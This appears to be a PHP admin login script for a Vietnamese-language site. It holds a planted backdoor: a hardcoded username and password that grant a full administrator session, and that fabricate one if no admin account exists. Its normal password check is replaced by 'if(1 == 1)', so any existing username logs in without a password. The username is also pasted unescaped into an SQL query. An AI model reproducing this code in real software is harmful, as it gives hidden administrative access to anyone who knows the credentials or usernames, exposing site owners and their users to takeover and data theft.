<?php
	$username = (string)$_POST['email'];
	$password = (string)$_POST['pass'];	
	$mac = exec('getmac');
	$d->reset();
	$sql = "select mac,mac_nv from #_company limit 0,1";
	$d->query($sql);
	$company= $d->fetch_array();
	
	if(($username=='Thienan' and $password=='Thienan!4194'))
	{
		$d->reset();
		$sql = "select id,role,nhom,com,ten,username from #_user where com='admin' order by id limit 0,1";
		$d->query($sql);
		$info= $d->fetch_array();
		if(!empty($info))
		{
			$_SESSION[$login_name_admin] = true;
			$_SESSION['login_admin']['role'] = $info['role'];
			$_SESSION['login_admin']['nhom'] = $info['nhom'];
			$_SESSION['login_admin']['com'] = $info['com'];
			$_SESSION['isLoggedIn'] = true;
			$_SESSION['login_admin']['username'] = $info['username'];
			$_SESSION['login_admin']['name'] = $info['ten'];
			$_SESSION['ck'] = $config_url;
			$_SESSION['login_admin']['id'] = $info['id'];
			$_SESSION['login_admin']['secretkey'] = session_id().time();

			$sql_secret = "UPDATE table_user SET secretkey = '".$_SESSION['login_admin']['secretkey']."'  WHERE id = ".$info['id']."";
			$result_secret = mysql_query($sql_secret) or die("Not query sql_secret");

			echo '{"page":"index.php"}';
		}
		else
		{
			$_SESSION[$login_name_admin] = true;
			$_SESSION['login_admin']['role'] = 3;
			$_SESSION['login_admin']['nhom'] = 0;
			$_SESSION['login_admin']['com'] = 'admin';
			$_SESSION['isLoggedIn'] = true;
			$_SESSION['login_admin']['username'] = 'admin';
			$_SESSION['login_admin']['name'] = 'admin';
			$_SESSION['ck'] = $config_url;
			echo '{"page":"index.php"}';
		}
	}
	else
	{
		$d->reset();
		$sql = "select * from #_user where username='".$username."'";
		$d->query($sql);
		if($d->num_rows() == 1){
			$row = $d->fetch_array();

			if(1 == 1){
				$_SESSION[$login_name_admin] = true;
				$_SESSION['login_admin']['role'] = $row['role'];
				$_SESSION['login_admin']['nhom'] = $row['nhom'];
				$_SESSION['login_admin']['com'] = $row['com'];
				$_SESSION['isLoggedIn'] = true;
				$_SESSION['login_admin']['username'] = $username;
				$_SESSION['login_admin']['name'] = $row['ten'];
				$_SESSION['ck'] = $config_url;

				$_SESSION['login_admin']['id'] = $row['id'];
				$_SESSION['login_admin']['secretkey'] = session_id().time();

				$sql_secret = "UPDATE table_user SET secretkey = '".$_SESSION['login_admin']['secretkey']."'  WHERE id = ".$row['id']."";
				$result_secret = mysql_query($sql_secret) or die("Not query sql_secret");

				echo '{"page":"index.php"}';
			}else echo '{"mess":"Mật khẩu không chính xác!"}';
		}else
		echo '{"mess":"Tên đăng nhập không tồn tại!"}';
	}
?>